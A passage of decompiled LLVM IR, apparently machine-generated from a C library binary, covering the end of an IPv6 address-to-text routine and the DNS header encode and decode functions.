dec_label_pc_1a1fc:                               ; preds = %dec_label_pc_1a1ec, %dec_label_pc_1a248
  %v0_1a23c = phi i32 [ -1, %dec_label_pc_1a1ec ], [ %v0_1a270, %dec_label_pc_1a248 ]
  %v0_1a22c = phi i32 [ -1, %dec_label_pc_1a1ec ], [ %v0_1a25c, %dec_label_pc_1a248 ]
  %v0_1a210 = phi i32 [ -1, %dec_label_pc_1a1ec ], [ %v0_1a2108, %dec_label_pc_1a248 ]
  %v0_1a248 = phi i32 [ 0, %dec_label_pc_1a1ec ], [ %v1_1a248, %dec_label_pc_1a248 ]
  %v4_1a200 = mul nuw nsw i32 %v0_1a248, 4
  %v5_1a200 = add i32 %v4_1a200, %v25_1a168
  %v1_1a204 = add i32 %v5_1a200, -32
  %v2_1a204 = inttoptr i32 %v1_1a204 to i32*
  %v3_1a204 = load i32, i32* %v2_1a204, align 4
  %v2_1a208 = icmp eq i32 %v3_1a204, 0
  %v7_1a210 = icmp eq i32 %v0_1a210, -1
  br i1 %v2_1a208, label %dec_label_pc_1a210, label %dec_label_pc_1a224

dec_label_pc_1a210:                               ; preds = %dec_label_pc_1a1fc
  br i1 %v7_1a210, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a210
  store i32 %v0_1a248, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1a248

.thread:                                          ; preds = %dec_label_pc_1a210
  %v1_1a21c.pre = load i32, i32* @r4, align 4
  %v2_1a21c = add i32 %v1_1a21c.pre, 1
  store i32 %v2_1a21c, i32* @r4, align 4
  br label %dec_label_pc_1a248

dec_label_pc_1a224:                               ; preds = %dec_label_pc_1a1fc
  br i1 %v7_1a210, label %dec_label_pc_1a248, label %dec_label_pc_1a22c

dec_label_pc_1a22c:                               ; preds = %dec_label_pc_1a224
  %v7_1a22c = icmp eq i32 %v0_1a22c, -1
  %v0_1a240.pre = load i32, i32* @r4, align 4
  %v1_1a234 = load i32, i32* @r7, align 4
  %v7_1a238 = icmp sgt i32 %v0_1a240.pre, %v1_1a234
  %or.cond = or i1 %v7_1a22c, %v7_1a238
  br i1 %or.cond, label %dec_label_pc_1a23c, label %dec_label_pc_1a244

dec_label_pc_1a23c:                               ; preds = %dec_label_pc_1a22c
  store i32 %v0_1a23c, i32* @r6, align 4
  store i32 %v0_1a240.pre, i32* @r7, align 4
  br label %dec_label_pc_1a244

dec_label_pc_1a244:                               ; preds = %dec_label_pc_1a22c, %dec_label_pc_1a23c
  %v0_1a22c13 = phi i32 [ %v0_1a23c, %dec_label_pc_1a23c ], [ %v0_1a22c, %dec_label_pc_1a22c ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a248

dec_label_pc_1a248:                               ; preds = %bb, %.thread, %dec_label_pc_1a224, %dec_label_pc_1a244
  %v0_1a270 = phi i32 [ %v0_1a23c, %.thread ], [ %v0_1a248, %bb ], [ %v0_1a23c, %dec_label_pc_1a224 ], [ -1, %dec_label_pc_1a244 ]
  %v0_1a2108 = phi i32 [ %v0_1a210, %.thread ], [ %v0_1a248, %bb ], [ -1, %dec_label_pc_1a224 ], [ -1, %dec_label_pc_1a244 ]
  %v0_1a25c = phi i32 [ %v0_1a22c, %.thread ], [ %v0_1a22c, %bb ], [ %v0_1a22c, %dec_label_pc_1a224 ], [ %v0_1a22c13, %dec_label_pc_1a244 ]
  %v1_1a248 = add nuw nsw i32 %v0_1a248, 1
  store i32 %v1_1a248, i32* %r1.global-to-local, align 4
  %v7_1a250 = icmp slt i32 %v1_1a248, 8
  br i1 %v7_1a250, label %dec_label_pc_1a1fc, label %dec_label_pc_1a254

dec_label_pc_1a254:                               ; preds = %dec_label_pc_1a248
  %v7_1a254 = icmp eq i32 %v0_1a270, -1
  br i1 %v7_1a254, label %dec_label_pc_1a274, label %dec_label_pc_1a25c

dec_label_pc_1a25c:                               ; preds = %dec_label_pc_1a254
  %v7_1a25c = icmp eq i32 %v0_1a25c, -1
  %v0_1a26c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1a25c, label %dec_label_pc_1a26c, label %dec_label_pc_1a264

dec_label_pc_1a264:                               ; preds = %dec_label_pc_1a25c
  %v1_1a264 = load i32, i32* @r7, align 4
  %v7_1a268 = icmp sgt i32 %v0_1a26c.pre, %v1_1a264
  br i1 %v7_1a268, label %dec_label_pc_1a26c, label %dec_label_pc_1a274

dec_label_pc_1a26c:                               ; preds = %dec_label_pc_1a25c, %dec_label_pc_1a264
  store i32 %v0_1a26c.pre, i32* @r7, align 4
  store i32 %v0_1a270, i32* @r6, align 4
  br label %dec_label_pc_1a274

dec_label_pc_1a274:                               ; preds = %dec_label_pc_1a264, %dec_label_pc_1a254, %dec_label_pc_1a26c
  %v0_1a274 = phi i32 [ %v0_1a25c, %dec_label_pc_1a264 ], [ %v0_1a25c, %dec_label_pc_1a254 ], [ %v0_1a270, %dec_label_pc_1a26c ]
  %v7_1a274 = icmp eq i32 %v0_1a274, -1
  br i1 %v7_1a274, label %bb49, label %dec_label_pc_1a27c

dec_label_pc_1a27c:                               ; preds = %dec_label_pc_1a274
  %v0_1a27c = load i32, i32* @r7, align 4
  %v7_1a280 = icmp slt i32 %v0_1a27c, 2
  br i1 %v7_1a280, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_1a27c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1a274, %dec_label_pc_1a27c, %bb48
  %v0_1a29023 = phi i32 [ %v0_1a274, %dec_label_pc_1a274 ], [ %v0_1a274, %dec_label_pc_1a27c ], [ -1, %bb48 ]
  %v2_1a284 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_1a284, i32* @r4, align 4
  %v9_1a2f0 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1a29063 = icmp eq i32 %v0_1a29023, -1
  br label %dec_label_pc_1a290

dec_label_pc_1a290:                               ; preds = %bb49, %dec_label_pc_1a344
  %v7_1a29067 = phi i1 [ %v7_1a29063, %bb49 ], [ %v7_1a290, %dec_label_pc_1a344 ]
  %v0_1a2bc66 = phi i32 [ 0, %bb49 ], [ %v1_1a344, %dec_label_pc_1a344 ]
  %v1_1a2ac65 = phi i32 [ %v0_1a29023, %bb49 ], [ %v0_1a290.pre, %dec_label_pc_1a344 ]
  %v3_1a2c464 = phi i32 [ %v2_1a284, %bb49 ], [ %v3_1a2b424, %dec_label_pc_1a344 ]
  br i1 %v7_1a29067, label %dec_label_pc_1a2bc, label %dec_label_pc_1a298

dec_label_pc_1a298:                               ; preds = %dec_label_pc_1a290
  %v9_1a298 = icmp eq i32 %v0_1a2bc66, %v1_1a2ac65
  %v5_1a29c = icmp slt i32 %v0_1a2bc66, %v1_1a2ac65
  br i1 %v5_1a29c, label %dec_label_pc_1a2bc, label %dec_label_pc_1a2a0

dec_label_pc_1a2a0:                               ; preds = %dec_label_pc_1a298
  %v1_1a2a0 = load i32, i32* @r7, align 4
  %v2_1a2a0 = add i32 %v1_1a2a0, %v1_1a2ac65
  %v6_1a2a8 = icmp slt i32 %v0_1a2bc66, %v2_1a2a0
  br i1 %v6_1a2a8, label %dec_label_pc_1a2ac, label %dec_label_pc_1a2bc

dec_label_pc_1a2ac:                               ; preds = %dec_label_pc_1a2a0
  br i1 %v9_1a298, label %bb51, label %dec_label_pc_1a344

bb51:                                             ; preds = %dec_label_pc_1a2ac
  %v4_1a2b4 = inttoptr i32 %v3_1a2c464 to i8*
  store i8 58, i8* %v4_1a2b4, align 1
  %v5_1a2b4 = load i32, i32* @r4, align 4
  %v6_1a2b4 = add i32 %v5_1a2b4, 1
  store i32 %v6_1a2b4, i32* @r4, align 4
  br label %dec_label_pc_1a344

dec_label_pc_1a2bc:                               ; preds = %dec_label_pc_1a2a0, %dec_label_pc_1a298, %dec_label_pc_1a290
  %v2_1a2bc = icmp eq i32 %v0_1a2bc66, 0
  br i1 %v2_1a2bc, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_1a2bc
  %v4_1a2c4 = inttoptr i32 %v3_1a2c464 to i8*
  store i8 58, i8* %v4_1a2c4, align 1
  %v5_1a2c4 = load i32, i32* @r4, align 4
  %v6_1a2c4 = add i32 %v5_1a2c4, 1
  store i32 %v6_1a2c4, i32* @r4, align 4
  %v0_1a2c8.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a2bc, %bb52
  %v0_1a308 = phi i32 [ %v3_1a2c464, %dec_label_pc_1a2bc ], [ %v6_1a2c4, %bb52 ]
  %v1_1a32c = phi i32 [ 0, %dec_label_pc_1a2bc ], [ %v0_1a2c8.pre, %bb52 ]
  %v7_1a2c8 = icmp eq i32 %v1_1a32c, 6
  br i1 %v7_1a2c8, label %dec_label_pc_1a2d0, label %dec_label_pc_1a328

dec_label_pc_1a2d0:                               ; preds = %.thread3
  %v0_1a2d0 = load i32, i32* @r6, align 4
  %v2_1a2d0 = icmp eq i32 %v0_1a2d0, 0
  br i1 %v2_1a2d0, label %dec_label_pc_1a2d8, label %dec_label_pc_1a328

dec_label_pc_1a2d8:                               ; preds = %dec_label_pc_1a2d0
  %v0_1a2d8 = load i32, i32* @r7, align 4
  %v7_1a2d8 = icmp eq i32 %v0_1a2d8, 6
  br i1 %v7_1a2d8, label %dec_label_pc_1a2f8, label %dec_label_pc_1a2e0

dec_label_pc_1a2e0:                               ; preds = %dec_label_pc_1a2d8
  %v7_1a2e0 = icmp eq i32 %v0_1a2d8, 5
  br i1 %v7_1a2e0, label %dec_label_pc_1a2e8, label %dec_label_pc_1a328

dec_label_pc_1a2e8:                               ; preds = %dec_label_pc_1a2e0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_1a2f0, label %dec_label_pc_1a2f8, label %dec_label_pc_1a328

dec_label_pc_1a2f8:                               ; preds = %dec_label_pc_1a2e8, %dec_label_pc_1a2d8
  %v2_1a2fc = sub i32 %v25_1a168, %v0_1a308
  %v0_1a300 = load i32, i32* @r8, align 4
  %v1_1a300 = add i32 %v0_1a300, 12
  %v1_1a304 = add i32 %v2_1a2fc, -32
  store i32 %v1_1a304, i32* %r2.global-to-local, align 4
  store i32 %v0_1a308, i32* %r1.global-to-local, align 4
  %v3_1a30c = call i32 @inet_ntop4(i32 %v1_1a300, i32 %v0_1a308, i32 %v1_1a304)
  %v2_1a310 = icmp eq i32 %v3_1a30c, 0
  br i1 %v2_1a310, label %dec_label_pc_1a39c, label %dec_label_pc_1a318

dec_label_pc_1a318:                               ; preds = %dec_label_pc_1a2f8
  %v0_1a318 = load i32, i32* @r4, align 4
  %v1_1a318 = inttoptr i32 %v0_1a318 to i8*
  %v3_1a31c = call i32 @strlen(i8* %v1_1a318)
  %v0_1a320 = load i32, i32* @r4, align 4
  %v2_1a320 = add i32 %v0_1a320, %v3_1a31c
  store i32 %v2_1a320, i32* @r4, align 4
  %v0_1a358.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a358

dec_label_pc_1a328:                               ; preds = %dec_label_pc_1a2e8, %dec_label_pc_1a2e0, %dec_label_pc_1a2d0, %.thread3
  %v4_1a32c = mul i32 %v1_1a32c, 4
  %v5_1a32c = add i32 %v4_1a32c, %v25_1a168
  store i32 %v0_1a308, i32* @r0, align 4
  %v1_1a334 = add i32 %v5_1a32c, -32
  %v2_1a334 = inttoptr i32 %v1_1a334 to i32*
  %v3_1a334 = load i32, i32* %v2_1a334, align 4
  store i32 %v3_1a334, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1e278.1187 to i32), i32* %r1.global-to-local, align 4
  %v7_1a33c = call i32 @sprintf(i32 %v0_1a308, i32 ptrtoint ([3 x i8]* @global_var_1e278.1187 to i32), i32 %v3_1a334, i32 %v5_1a32c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_1a340 = load i32, i32* @r4, align 4
  %v2_1a340 = add i32 %v0_1a340, %v7_1a33c
  store i32 %v2_1a340, i32* @r4, align 4
  br label %dec_label_pc_1a344

dec_label_pc_1a344:                               ; preds = %dec_label_pc_1a2ac, %bb51, %dec_label_pc_1a328
  %v3_1a2b424 = phi i32 [ %v3_1a2c464, %dec_label_pc_1a2ac ], [ %v6_1a2b4, %bb51 ], [ %v2_1a340, %dec_label_pc_1a328 ]
  %v0_1a344 = load i32, i32* @r5, align 4
  %v1_1a344 = add i32 %v0_1a344, 1
  %v0_1a290.pre = load i32, i32* @r6, align 4
  store i32 %v1_1a344, i32* @r5, align 4
  %v7_1a34c = icmp slt i32 %v1_1a344, 8
  %v7_1a290 = icmp eq i32 %v0_1a290.pre, -1
  br i1 %v7_1a34c, label %dec_label_pc_1a290, label %dec_label_pc_1a350

dec_label_pc_1a350:                               ; preds = %dec_label_pc_1a344
  br i1 %v7_1a290, label %.thread4, label %dec_label_pc_1a358

dec_label_pc_1a358:                               ; preds = %dec_label_pc_1a350, %dec_label_pc_1a318
  %v3_1a364 = phi i32 [ %v3_1a2b424, %dec_label_pc_1a350 ], [ %v2_1a320, %dec_label_pc_1a318 ]
  %v0_1a358 = phi i32 [ %v0_1a290.pre, %dec_label_pc_1a350 ], [ %v0_1a358.pre, %dec_label_pc_1a318 ]
  %v1_1a358 = load i32, i32* @r7, align 4
  %v2_1a358 = add i32 %v1_1a358, %v0_1a358
  %v7_1a35c = icmp eq i32 %v2_1a358, 8
  br i1 %v7_1a35c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_1a358
  %v4_1a364 = inttoptr i32 %v3_1a364 to i8*
  store i8 58, i8* %v4_1a364, align 1
  %v5_1a364 = load i32, i32* @r4, align 4
  %v6_1a364 = add i32 %v5_1a364, 1
  store i32 %v6_1a364, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a358, %dec_label_pc_1a350, %bb53
  %v2_1a36c = phi i32 [ %v3_1a364, %dec_label_pc_1a358 ], [ %v3_1a2b424, %dec_label_pc_1a350 ], [ %v6_1a364, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1a36c = inttoptr i32 %v2_1a36c to i8*
  store i8 0, i8* %v3_1a36c, align 1
  %v4_1a36c = load i32, i32* @r4, align 4
  %v5_1a36c = add i32 %v4_1a36c, 1
  store i32 %v2_1a284, i32* %r1.global-to-local, align 4
  %v2_1a374 = sub i32 %v5_1a36c, %v2_1a284
  %v1_1a378 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_1a374, %v1_1a378
  br i1 %tmp69, label %dec_label_pc_1a380, label %dec_label_pc_1a394

dec_label_pc_1a380:                               ; preds = %.thread4
  %v0_1a380 = call i32 @__errno_location()
  %v0_1a388 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a388, i32* %r2.global-to-local, align 4
  %v2_1a38c = inttoptr i32 %v0_1a380 to i32*
  store i32 28, i32* %v2_1a38c, align 4
  %v0_1a3b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a3b4

dec_label_pc_1a394:                               ; preds = %.thread4
  %v0_1a394 = load i32, i32* @sb, align 4
  %v2_1a398 = bitcast i32* %stack_var_-110 to i8*
  %v3_1a398 = call i32 @strcpy(i32 %v0_1a394, i8* %v2_1a398)
  br label %dec_label_pc_1a39c

dec_label_pc_1a39c:                               ; preds = %dec_label_pc_1a2f8, %dec_label_pc_1a190, %dec_label_pc_1a394
  %v0_1a39c = phi i32 [ 0, %dec_label_pc_1a2f8 ], [ %v3_1a19c, %dec_label_pc_1a190 ], [ %v3_1a398, %dec_label_pc_1a394 ]
  store i32 %v0_1a39c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a3b4

dec_label_pc_1a3a4:                               ; preds = %dec_label_pc_1a184
  %v0_1a3a4 = call i32 @__errno_location()
  %v2_1a3ac = inttoptr i32 %v0_1a3a4 to i32*
  store i32 97, i32* %v2_1a3ac, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a3b4

dec_label_pc_1a3b4:                               ; preds = %dec_label_pc_1a39c, %dec_label_pc_1a380, %dec_label_pc_1a3a4
  %v0_1a3b4 = phi i32 [ %v0_1a39c, %dec_label_pc_1a39c ], [ %v0_1a3b4.pre, %dec_label_pc_1a380 ], [ 0, %dec_label_pc_1a3a4 ]
  store i32 %v6_1a168, i32* %r5.global-to-local, align 4
  ret i32 %v0_1a3b4

; uselistorder directives
  uselistorder i1 %v7_1a290, { 1, 0 }
  uselistorder i32 %v0_1a290.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1a344, { 1, 0, 2 }
  uselistorder i32 %v0_1a308, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1a2c464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1a2ac65, { 2, 0, 1 }
  uselistorder i32 %v0_1a2bc66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_1a284, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1a29023, { 1, 0 }
  uselistorder i32 %v0_1a274, { 1, 2, 0 }
  uselistorder i32 %v1_1a248, { 1, 2, 0 }
  uselistorder i32 %v0_1a25c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a270, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1a210, { 1, 0 }
  uselistorder i32 %v0_1a248, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1a22c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1a23c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1a1e0, { 2, 1, 0 }
  uselistorder i32 %v1_1a1c0, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_1a168, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 3, 2, 9, 1, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 11, 2, 3, 4, 8 }
  uselistorder i32 (i32, i8*)* @strcpy, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sprintf, { 1, 3, 2, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 15, 0, 12, 13, 14, 6, 26, 24, 20, 25, 7, 1, 2, 3, 4, 5, 8, 9, 10, 11, 16, 17, 18, 19, 23, 21, 22 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1a3b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a39c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a344, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1a290, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a274, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a26c, { 1, 0 }
  uselistorder label %dec_label_pc_1a248, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1a244, { 1, 0 }
  uselistorder label %dec_label_pc_1a1fc, { 1, 0 }
  uselistorder label %dec_label_pc_1a1d0, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_1a3cc = load i32, i32* @r4, align 4
  store i32 %v3_1a3cc, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_1a3dc = icmp sgt i32 %arg3, 11
  br i1 %v7_1a3dc, label %dec_label_pc_1a3e0, label %dec_label_pc_1a4a8

dec_label_pc_1a3e0:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_1a3e0 = add i32 %tmp, 1
  %v2_1a3e0 = inttoptr i32 %v1_1a3e0 to i8*
  %v3_1a3e0 = load i8, i8* %v2_1a3e0, align 1
  store i8 %v3_1a3e0, i8* %tmp18, align 1
  %v2_1a3e8 = load i32, i32* %arg1, align 4
  %v1_1a3ec = trunc i32 %v2_1a3e8 to i8
  %v4_1a3ec = add i32 %arg2, 1
  %v5_1a3ec = inttoptr i32 %v4_1a3ec to i8*
  store i8 %v1_1a3ec, i8* %v5_1a3ec, align 1
  %v0_1a3f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a3f0 = add i32 %v0_1a3f0, 12
  %v2_1a3f0 = inttoptr i32 %v1_1a3f0 to i32*
  %v3_1a3f0 = load i32, i32* %v2_1a3f0, align 4
  %v1_1a3f4 = add i32 %v0_1a3f0, 4
  %v2_1a3f4 = inttoptr i32 %v1_1a3f4 to i32*
  %v3_1a3f4 = load i32, i32* %v2_1a3f4, align 4
  %v1_1a3f8 = add i32 %v0_1a3f0, 16
  %v2_1a3f8 = inttoptr i32 %v1_1a3f8 to i32*
  %v3_1a3f8 = load i32, i32* %v2_1a3f8, align 4
  %v1_1a3fc = add i32 %tmp, 8
  %v2_1a3fc = inttoptr i32 %v1_1a3fc to i32*
  %v3_1a3fc = load i32, i32* %v2_1a3fc, align 4
  %v2_1a400 = icmp eq i32 %v3_1a3f0, 0
  %. = select i1 %v2_1a400, i32 0, i32 4
  %v2_1a40c = icmp eq i32 %v3_1a3f4, 0
  %v1_1a410 = add i32 %v0_1a3f0, 20
  %v2_1a410 = inttoptr i32 %v1_1a410 to i32*
  %v3_1a410 = load i32, i32* %v2_1a410, align 4
  %storemerge12 = select i1 %v2_1a40c, i32 0, i32 128
  %v1_1a41c = urem i32 %v3_1a3fc, 16
  %v2_1a420 = icmp eq i32 %v3_1a3f8, 0
  %.29 = select i1 %v2_1a420, i32 0, i32 2
  %v4_1a42c = mul nuw nsw i32 %v1_1a41c, 8
  %v5_1a42c = or i32 %v4_1a42c, %.
  %v2_1a430 = icmp eq i32 %v3_1a410, 0
  br i1 %v2_1a430, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_1a3e0
  %v2_1a434 = or i32 %v5_1a42c, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1a3e0, %bb25
  %v1_1a43c = phi i32 [ %v5_1a42c, %dec_label_pc_1a3e0 ], [ %v2_1a434, %bb25 ]
  %v2_1a438 = or i32 %.29, %storemerge12
  %v2_1a43c = or i32 %v2_1a438, %v1_1a43c
  %v1_1a440 = trunc i32 %v2_1a43c to i8
  %v2_1a440 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a440 = add i32 %v2_1a440, 2
  %v4_1a440 = inttoptr i32 %v3_1a440 to i8*
  store i8 %v1_1a440, i8* %v4_1a440, align 1
  %v0_1a444 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a444 = add i32 %v0_1a444, 24
  %v1_1a448 = inttoptr i32 %v1_1a444 to i32*
  %v2_1a448 = load i32, i32* %v1_1a448, align 4
  %v3_1a448 = add i32 %v0_1a444, 28
  %v4_1a448 = inttoptr i32 %v3_1a448 to i32*
  %v5_1a448 = load i32, i32* %v4_1a448, align 4
  %v2_1a44c = icmp eq i32 %v2_1a448, 0
  %v1_1a450 = urem i32 %v5_1a448, 16
  %.30 = select i1 %v2_1a44c, i32 0, i32 128
  %v2_1a45c = or i32 %v1_1a450, %.30
  %v1_1a460 = trunc i32 %v2_1a45c to i8
  %v2_1a460 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a460 = add i32 %v2_1a460, 3
  %v4_1a460 = inttoptr i32 %v3_1a460 to i8*
  store i8 %v1_1a460, i8* %v4_1a460, align 1
  %v0_1a464 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a464 = add i32 %v0_1a464, 33
  %v2_1a464 = inttoptr i32 %v1_1a464 to i8*
  %v3_1a464 = load i8, i8* %v2_1a464, align 1
  %v2_1a468 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a468 = add i32 %v2_1a468, 4
  %v4_1a468 = inttoptr i32 %v3_1a468 to i8*
  store i8 %v3_1a464, i8* %v4_1a468, align 1
  %v0_1a46c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a46c = add i32 %v0_1a46c, 32
  %v2_1a46c = inttoptr i32 %v1_1a46c to i32*
  %v3_1a46c = load i32, i32* %v2_1a46c, align 4
  %v1_1a470 = trunc i32 %v3_1a46c to i8
  %v2_1a470 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a470 = add i32 %v2_1a470, 5
  %v4_1a470 = inttoptr i32 %v3_1a470 to i8*
  store i8 %v1_1a470, i8* %v4_1a470, align 1
  %v0_1a474 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a474 = add i32 %v0_1a474, 37
  %v2_1a474 = inttoptr i32 %v1_1a474 to i8*
  %v3_1a474 = load i8, i8* %v2_1a474, align 1
  %v2_1a478 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a478 = add i32 %v2_1a478, 6
  %v4_1a478 = inttoptr i32 %v3_1a478 to i8*
  store i8 %v3_1a474, i8* %v4_1a478, align 1
  %v0_1a47c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a47c = add i32 %v0_1a47c, 36
  %v2_1a47c = inttoptr i32 %v1_1a47c to i32*
  %v3_1a47c = load i32, i32* %v2_1a47c, align 4
  %v1_1a480 = trunc i32 %v3_1a47c to i8
  %v2_1a480 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a480 = add i32 %v2_1a480, 7
  %v4_1a480 = inttoptr i32 %v3_1a480 to i8*
  store i8 %v1_1a480, i8* %v4_1a480, align 1
  %v0_1a484 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a484 = add i32 %v0_1a484, 41
  %v2_1a484 = inttoptr i32 %v1_1a484 to i8*
  %v3_1a484 = load i8, i8* %v2_1a484, align 1
  %v2_1a488 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a488 = add i32 %v2_1a488, 8
  %v4_1a488 = inttoptr i32 %v3_1a488 to i8*
  store i8 %v3_1a484, i8* %v4_1a488, align 1
  %v0_1a48c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a48c = add i32 %v0_1a48c, 40
  %v2_1a48c = inttoptr i32 %v1_1a48c to i32*
  %v3_1a48c = load i32, i32* %v2_1a48c, align 4
  %v1_1a490 = trunc i32 %v3_1a48c to i8
  %v2_1a490 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a490 = add i32 %v2_1a490, 9
  %v4_1a490 = inttoptr i32 %v3_1a490 to i8*
  store i8 %v1_1a490, i8* %v4_1a490, align 1
  %v0_1a494 = load i32, i32* %lr.global-to-local, align 4
  %v1_1a494 = add i32 %v0_1a494, 45
  %v2_1a494 = inttoptr i32 %v1_1a494 to i8*
  %v3_1a494 = load i8, i8* %v2_1a494, align 1
  %v2_1a498 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a498 = add i32 %v2_1a498, 10
  %v4_1a498 = inttoptr i32 %v3_1a498 to i8*
  store i8 %v3_1a494, i8* %v4_1a498, align 1
  %v0_1a49c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a49c = add i32 %v0_1a49c, 44
  %v2_1a49c = inttoptr i32 %v1_1a49c to i32*
  %v3_1a49c = load i32, i32* %v2_1a49c, align 4
  %v1_1a4a0 = trunc i32 %v3_1a49c to i8
  %v2_1a4a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a4a0 = add i32 %v2_1a4a0, 11
  %v4_1a4a0 = inttoptr i32 %v3_1a4a0 to i8*
  store i8 %v1_1a4a0, i8* %v4_1a4a0, align 1
  %v2_1a4ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a4a8

dec_label_pc_1a4a8:                               ; preds = %entry, %bb26
  %v2_1a4ac = phi i32 [ %v3_1a3cc, %entry ], [ %v2_1a4ac.pre, %bb26 ]
  %v0_1a4a8 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_1a4ac, i32* @r4, align 4
  ret i32 %v0_1a4a8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 2, 0 }
  uselistorder i32 37, { 2, 1, 0, 3 }
  uselistorder i32 33, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a4a8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1a4b0 = load i8, i8* %arg1, align 1
  %v4_1a4b0 = zext i8 %v3_1a4b0 to i32
  %v2_1a4b4 = add i32 %tmp, 1
  %v3_1a4b4 = inttoptr i32 %v2_1a4b4 to i8*
  %v4_1a4b4 = load i8, i8* %v3_1a4b4, align 1
  %v5_1a4b4 = zext i8 %v4_1a4b4 to i32
  %v4_1a4b8 = mul nuw nsw i32 %v4_1a4b0, 256
  %v5_1a4b8 = or i32 %v5_1a4b4, %v4_1a4b8
  %v2_1a4bc = inttoptr i32 %arg2 to i32*
  store i32 %v5_1a4b8, i32* %v2_1a4bc, align 4
  %v2_1a4c0 = add i32 %tmp, 2
  %v3_1a4c0 = inttoptr i32 %v2_1a4c0 to i8*
  %v4_1a4c0 = load i8, i8* %v3_1a4c0, align 1
